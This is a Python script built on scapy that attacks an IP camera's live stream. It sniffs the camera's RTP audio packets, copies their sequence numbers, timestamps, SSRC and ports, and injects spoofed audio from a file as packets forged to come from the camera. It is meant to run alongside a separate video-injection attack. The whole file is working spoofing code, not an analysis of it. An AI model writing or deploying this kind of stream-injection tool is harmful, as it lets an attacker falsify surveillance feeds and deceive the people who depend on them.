from scapy.all import IP, UDP, RTP, Raw, send, sniff
import time
import struct

IFACE = "en0"                  
IP_CAMERA = "192.168.0.81"     
IP_CLIENT = "192.168.0.162"    

RTP_PORT_CAMERA = 0       
RTP_PORT_CLIENT = 0        
SSRC_INJECTED = 0x12345678 
INIT_SEQ_NUM = 0          
PAYLOAD_TYPE = 8             # Default to PCMA (8)

SAMPLE_RATE = 8000           # standard G.711 sample rate
PACKET_DURATION_MS = 20      # typical packet duration
SAMPLES_PER_PACKET = int(SAMPLE_RATE * PACKET_DURATION_MS / 1000) # 160 bytes for 20ms
TIMESTAMP_INC = SAMPLES_PER_PACKET 


def get_stream_params():
    print(f"[*] Sniffing for 1 valid RTP AUDIO packet (PT 8 or 0) on {IFACE}...")
    
    while True:
        packets = sniff(count=1, filter=f"udp and src {IP_CAMERA} and dst {IP_CLIENT}", iface=IFACE, timeout=5)
        
        if not packets:
            print("[-] Timeout waiting for packet. Retrying...")
            continue
            
        pkt = packets[0]
        pt = -1
        
        # extract the payload type to check if it's audio
        if RTP in pkt:
            pt = pkt[RTP].payload_type
        else:
            try:
                udp_payload = bytes(pkt[UDP].payload)
                if len(udp_payload) >= 12:
                    header = struct.unpack("!HHII", udp_payload[:12])
                    pt = (header[0] & 0xFF) & 0x7F
            except:
                continue

        # Check for Audio (PCMU=0, PCMA=8) so we dont get any video packets
        if pt == 8 or pt == 0:
             if RTP in pkt:
                rtp = pkt[RTP]
                print(f"[+] Synced to AUDIO! Seq={rtp.sequence}, TS={rtp.timestamp}, SSRC={hex(rtp.sourcesync)}, PT={rtp.payload_type}")
                return rtp.sequence + 1, rtp.timestamp + TIMESTAMP_INC, rtp.sourcesync, rtp.payload_type, pkt[UDP].sport, pkt[UDP].dport
             else:
                udp_payload = bytes(pkt[UDP].payload)
                header = struct.unpack("!HHII", udp_payload[:12])
                seq = header[1]
                ts = header[2]
                ssrc = header[3]
                print(f"[+] Synced to AUDIO (Manual)! Seq={seq}, TS={ts}, SSRC={hex(ssrc)}, PT={pt}")
                return seq + 1, ts + TIMESTAMP_INC, ssrc, pt, pkt[UDP].sport, pkt[UDP].dport
        else:
             print(f"[*] Ignored Video/Other packet (PT={pt})... waiting for Audio.")

    return INIT_SEQ_NUM, 0, SSRC_INJECTED, PAYLOAD_TYPE, 0, 0

def inject_audio(audio_file):
    # auto-sync parameters so that we can inject the audio correctly
    sequence_num, timestamp, ssrc, payload_type, sport, dport = get_stream_params()
    
    print(f"[*] Starting AUDIO injection on {IFACE} -> SrcPort:{sport} DstPort:{dport}...")
    
    try:
        with open(audio_file, 'rb') as f:
            raw_audio = f.read()

        # Split audio into chunks
        
        chunks = [raw_audio[i:i + SAMPLES_PER_PACKET] for i in range(0, len(raw_audio), SAMPLES_PER_PACKET)]
        
        print(f"[*] Found {len(chunks)} audio chunks to inject.")
        
        for chunk in chunks:
            # padding if last chunk is too small
            if len(chunk) < SAMPLES_PER_PACKET:
                chunk += b'\x00' * (SAMPLES_PER_PACKET - len(chunk))

            packet = IP(src=IP_CAMERA, dst=IP_CLIENT) / \
                     UDP(sport=sport, dport=dport) / \
                     RTP(
                         version=2,
                         payload_type=payload_type,
                         sequence=sequence_num,
                         timestamp=timestamp,
                         sourcesync=ssrc, 
                         marker=0 
                     ) / Raw(load=chunk)

            del packet[IP].chksum
            del packet[UDP].chksum
            
            send(packet, iface=IFACE, verbose=False)
            
            sequence_num = (sequence_num + 1) % 65536
            timestamp = (timestamp + TIMESTAMP_INC) % 4294967296
            
            # Timing: 20ms per packet
            time.sleep(0.019) 

    except Exception as e:
        print(f"Audio Injection failed: {e}")
    finally:
        print("\n[*] Audio Injection finished.")

if __name__ == "__main__":
    print("\n[!] Run this in a separate terminal ALONGSIDE injector.py")
    print("[!] Wait for sync, then press Enter when you start the main video attack.")
    input("Press Enter to start syncing...")
    
    inject_audio("raw.audio")
